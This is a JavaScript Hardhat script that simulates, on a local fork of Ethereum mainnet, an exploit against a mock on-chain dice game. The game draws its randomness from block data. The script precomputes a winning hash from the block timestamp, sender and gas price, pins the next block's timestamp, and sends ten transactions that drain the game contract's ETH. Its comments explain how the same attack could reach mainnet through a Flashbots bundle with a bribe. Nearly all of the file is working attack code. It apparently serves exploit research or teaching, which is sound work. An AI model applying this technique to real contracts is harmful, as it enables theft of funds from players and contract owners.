const { network, ethers } = require("hardhat");
const path = require("path");

/**
 * Setup:
 * 1. Using a local fork of the Ethereum network and a local wallet instance (Hardhat VM)
 * 2. Hardhat network & ethers.js
 * 3. Ethereum mainnet RPC provider
 * 4. Solidity contracts: IMockSolidityDiceGame, MockSolidityDiceGame, MockSolidityDiceGameExploit, Context, Ownable
 * 5. ethers.js "Contract" instances for the contracts 
 * 6. Deploy VM fork of the Ethereum network at the previous block and deploy the contracts
 * 7. Exploit the MockSolidityDiceGame contract
 * 8. Verify the exploit
 * 9. Clean up the environment
 */

const FUND_AMOUNT = ethers.parseEther("100");

const PROVIDER = new ethers.JsonRpcProvider("https://ethereum.publicnode.com");
const JSON_RPC_URL = "https://ethereum.publicnode.com";

const MOCKSOLIDITYDICEGAME_COMPILATION_PATH = require(path.join(
  process.cwd(),
  "contracts/MockSolidityDiceGame/compilation",
  "MockSolidityDiceGame.json"
));
const MOCKSOLIDITYDICEGAMEEXPLOIT_COMPILATION_PATH = require(path.join(
  process.cwd(),
  "contracts/MockSolidityDiceGameExploit/compilation",
  "MockSolidityDiceGameExploit.json"
));

const MOCKSOLIDITYDICEGAME_ABI = MOCKSOLIDITYDICEGAME_COMPILATION_PATH.abi;
const MOCKSOLIDITYDICEGAMEEXPLOIT_ABI = MOCKSOLIDITYDICEGAMEEXPLOIT_COMPILATION_PATH.abi;
const MOCKSOLIDITYDICEGAMEEXPLOIT_BYTECODE = MOCKSOLIDITYDICEGAMEEXPLOIT_COMPILATION_PATH.bytecode;

// Initialize the VM fork of the Ethereum network, get the local account signer, set the balance of the local account to 100 ETH
// then deploy the MockSolidityDiceGameExploit contract and return the initialized contracts and local account
const initializeVMFork = async () => {
    // Disable auto-mining
    await network.provider.send("evm_setAutomine", [false]);
    // Set mining interval to 0 (mine immediately when requested)
    await network.provider.send("evm_setIntervalMining", [0]);

    // Retrieve the current block number from the mainnet
    const currentBlockNumber = await PROVIDER.send("eth_blockNumber");
    // Convert the block number from hex to decimal and subtract 1
    const forkBlockNumber = parseInt(currentBlockNumber, 16) - 1;

    console.log(`Current Block Number: ${parseInt(currentBlockNumber, 16)}`);
    console.log(`Forking from Block Number: ${forkBlockNumber}`);

    // Step 1: Fork the Ethereum mainnet
    await network.provider.request({
        method: "hardhat_reset",
        params: [{
            forking: {
                jsonRpcUrl: `${JSON_RPC_URL}`,
                blockNumber: forkBlockNumber
            },
        }],
    });

    // Get the local account signer
    const [localAccount] = await ethers.getSigners();

    // Set the balance of the local account to 100 ETH
    await network.provider.send("hardhat_setBalance", [
        localAccount.address,
        ethers.toBeHex(FUND_AMOUNT)
    ]);

    // Deploy the MockSolidityDiceGameExploit contract
    const MockSolidityDiceGameExploit = new ethers.ContractFactory(MOCKSOLIDITYDICEGAMEEXPLOIT_ABI, MOCKSOLIDITYDICEGAMEEXPLOIT_BYTECODE, localAccount);
    const MockSolidityDiceGameExploitContract = await MockSolidityDiceGameExploit.deploy(
        { value: ethers.parseEther("10") } // Send 10 ETH with deployment (sent to MockSolidityDiceGame contract when deployed via the exploit contract)
    );
    const MockSolidityDiceGameExploitAddress = MockSolidityDiceGameExploitContract.target;
    await network.provider.send("evm_mine");
    await MockSolidityDiceGameExploitContract.waitForDeployment();
    console.log('MockSolidityDiceGameExploit contract deployed at:', MockSolidityDiceGameExploitAddress);

    LOCAL_FORK = {
        localAccount,
        MockSolidityDiceGameExploitContract,
        MockSolidityDiceGameExploitAddress
    }
    
    console.log(`VM local fork initialized.\n`);
    return LOCAL_FORK;
}

// Execute the exploit on the VM fork of the Ethereum network
const executeSimulatedExploit = async () => {
    await initializeVMFork();
    const { localAccount, MockSolidityDiceGameExploitContract } = LOCAL_FORK;

    // Get the address of the MockSolidityDiceGame contract from the exploit contract using the MockSolidityDiceGameAddress() function
    const MockSolidityDiceGameAddress = await MockSolidityDiceGameExploitContract.MockSolidityDiceGameAddress();
    // Create a new MockSolidityDiceGame contract instance
    const MockSolidityDiceGameContract = new ethers.Contract(MockSolidityDiceGameAddress, MOCKSOLIDITYDICEGAME_ABI, localAccount);

    // Get block info at snapshot
    const snapshotBlock = await ethers.provider.getBlock('latest');
    console.log(`Initial Snapshot block: number=${snapshotBlock.number}, timestamp=${snapshotBlock.timestamp}`);

    // Take a snapshot of the current state so we can revert to the correct block after calling
    // the testDeterministicHashes function and mining a block
    const snapshotId = await network.provider.send("evm_snapshot");
    console.log("State snapshot taken, ID:", snapshotId);

    // Call the testDeterministicHashResult function on the MockSolidityDiceGameExploit contract
    // This function updates the storedHashInputs variable (struct) with the hash (converted to uint256) 
    // of the msg.sender, anticipated block timestamp, txOrigin, txGasPrice, and blockHash if it satisfies the win condition
    
    // Since this function call is a transaction, we must wait for it to be mined
    const testDeterministicHashesTx = await MockSolidityDiceGameExploitContract.testDeterministicHashResult();
    await network.provider.send("evm_mine");
    await testDeterministicHashesTx.wait();

    // Step 2: Retrieve stored hash inputs after mining
    const storedHashInputs = await MockSolidityDiceGameExploitContract.retrieveStoredHashInputs();
    const structuredStoredHashInputs = {
        msgSender: storedHashInputs.msgSender,
        txOrigin: storedHashInputs.txOrigin,
        blockTimestamp: storedHashInputs.blockTimestamp.toString(),
        txGasPrice: storedHashInputs.txGasPrice.toString(),
        blockHash: storedHashInputs.blockHash
    }
    console.log("Stored hash inputs:", structuredStoredHashInputs);

    /* ******************************************************************************************************************************************* 
     * At this stage, we have the winning hash inputs stored in the exploit contract and would like to execute the winning transaction on the
     * mainnet. We can't do that here so we'll revert to the snapshot (i.e. the correct block) to simulate the mainnet state.
     * 
     * To mimic the mainnet state, we'll set the block timestamp to the stored timestamp and mine a block after a series of 10 transactions to 
     * drain the contract balance of the MockSolidityDiceGame contract. On the mainnet, the block timestamp is variable and can be set to any value
     * in the range of the previous block timestamp + 15 seconds by the builder, but usually it's set to the previous block timestamp + 12 seconds.
     * 
     * This means it's possible to reliably predict the block timestamp and set it to the stored timestamp to execute the winning transaction
     * before the current block is finalized, using a service like Flashbots to send the series of transactions in a bundle with a bribe.
     * 
     * ******************************************************************************************************************************************* */

    // Revert to the correct block after calling the testDeterministicHashResult() function and mining a block
    await network.provider.send("evm_revert", [snapshotId]);

    if (structuredStoredHashInputs.txGasPrice > 0n) {
        console.log(`Winning combination found with gas price: ${ethers.formatUnits(structuredStoredHashInputs.txGasPrice, "gwei")} Gwei`);
        
        // Get current network gas price and validate
        const feeData = await ethers.provider.getFeeData();
        const currentGasPrice = feeData.gasPrice;
        const storedGasPrice = structuredStoredHashInputs.txGasPrice;
        console.log(`Minimum required: ${ethers.formatUnits(currentGasPrice, "gwei")} Gwei`);
        
        // Check if the stored gas price is less than the current gas price
        if (storedGasPrice < currentGasPrice) {
            console.log(`Gas price too low (${ethers.formatUnits(storedGasPrice, "gwei")} Gwei)`);
            return;
        }
        console.log(`Gas price sufficient (${ethers.formatUnits(storedGasPrice, "gwei")} Gwei)`);

        // Get initial balances
        const initialDiceGameBalance = await MockSolidityDiceGameContract.getEthBalance();
        console.log(`\nInitial MockSolidityDiceGame contract balance: ${ethers.formatEther(initialDiceGameBalance)}`);
        const initialExploitBalance = await MockSolidityDiceGameExploitContract.getEthBalance();
        console.log(`Initial MockSolidityDiceGameExploit contract balance: ${ethers.formatEther(initialExploitBalance)}`);

        // Create multiple transactions before mining
        const pendingTransactions = [];
        const maxAttempts = 10;

        console.log("\nSubmitting transactions to mempool...");
        let currentNonce = await localAccount.getNonce();

        // Get initial block parameters
        const initialBlock = await ethers.provider.getBlock('latest');
        console.log('\nInitial block parameters:');
        console.log(`Block number: ${initialBlock.number}`);
        console.log(`Block timestamp: ${initialBlock.timestamp}`);
        console.log(`Block hash: ${initialBlock.hash}`);
        console.log(`Previous block hash: ${initialBlock.parentHash}`);

        for (let i = 0; i < maxAttempts; i++) {
            try {
                // Get current block parameters before each transaction
                const currentBlock = await ethers.provider.getBlock('latest');

                // Verify hash inputs match stored values
                if (currentBlock.hash !== structuredStoredHashInputs.blockHash) {
                    console.log('WARNING: Block hash mismatch!');
                    console.log(`Expected: ${structuredStoredHashInputs.blockHash}`);
                    console.log(`Current:  ${currentBlock.hash}`);
                }

                const tx = await MockSolidityDiceGameExploitContract.executeWinningDiceRoll(
                    structuredStoredHashInputs,
                    {
                        gasPrice: structuredStoredHashInputs.txGasPrice,
                        value: ethers.parseEther("1"), // Send 1 ETH with the transaction as required by the MockSolidityDiceGame contract
                        gasLimit: 500000,
                        nonce: currentNonce,
                        type: 0  // Legacy transaction type to avoid EIP-1559 fee calculations
                    }
                );
                pendingTransactions.push(tx);
                currentNonce++;
            } catch (error) {
                console.log(`Failed to create transaction ${i + 1}:`, error.message);
            }
        }

        console.log(`\nMining ${pendingTransactions.length} transactions...`);
        
        // Get block parameters before mining
        const preMineBlock = await ethers.provider.getBlock('latest');
        console.log('\nPre-mine block parameters:');
        console.log(`Block number: ${preMineBlock.number}`);
        console.log(`Block timestamp: ${preMineBlock.timestamp}`);
        console.log(`Block hash: ${preMineBlock.hash}`);

        // Force the mining timestamp to match our stored timestamp
        await network.provider.send("evm_setNextBlockTimestamp", [Number(BigInt(structuredStoredHashInputs.blockTimestamp))]);
        await network.provider.send("evm_mine");

        // Get block parameters after mining
        const postMineBlock = await ethers.provider.getBlock('latest');
        console.log('\nPost-mine block parameters:');
        console.log(`Block number: ${postMineBlock.number}`);
        console.log(`Block timestamp: ${postMineBlock.timestamp}`);
        console.log(`Block hash: ${postMineBlock.hash}`);

        // Process transaction receipts and emitted events
        let successfulTransactions = 0;
        console.log("\nProcessing transaction results:");
        
        for (let i = 0; i < pendingTransactions.length; i++) {
            try {
                const receipt = await pendingTransactions[i].wait();
                const diceRollEvents = receipt.logs.filter(
                    log => log.fragment && log.fragment.name === 'DiceRollEvent'
                );

                if (diceRollEvents.length > 0) {
                    const [success, gasPrice, inputs] = diceRollEvents[0].args;
                    if (success) {
                        successfulTransactions++;
                        console.log(`Transaction ${i + 1} successful`);
                    } else {
                        console.log(`Transaction ${i + 1} failed - Event reported failure`);
                    }
                }
            } catch (error) {
                console.log(`Transaction ${i + 1} failed with error:`, error.message);
            }
        }

        // Get final balances
        const finalDiceGameBalance = await MockSolidityDiceGameContract.getEthBalance();
        const finalExploitBalance = await MockSolidityDiceGameExploitContract.getEthBalance();

        console.log(`\nExploit complete:`);
        console.log(`Total transactions: ${pendingTransactions.length}`);
        console.log(`Successful transactions: ${successfulTransactions}`);
        console.log(`Initial MockSolidityDiceGame contract balance: ${ethers.formatEther(initialDiceGameBalance)} ETH`);
        console.log(`Final MockSolidityDiceGame contract balance: ${ethers.formatEther(finalDiceGameBalance)} ETH`);
        console.log(`Initial MockSolidityDiceGameExploit contract balance: ${ethers.formatEther(initialExploitBalance)} ETH`);
        console.log(`Final MockSolidityDiceGameExploit contract balance: ${ethers.formatEther(finalExploitBalance)} ETH`);
    } else {
        console.log("No winning combination found");
    }
}
executeSimulatedExploit().catch(error => {
    console.error(error);
    process.exit(1);
});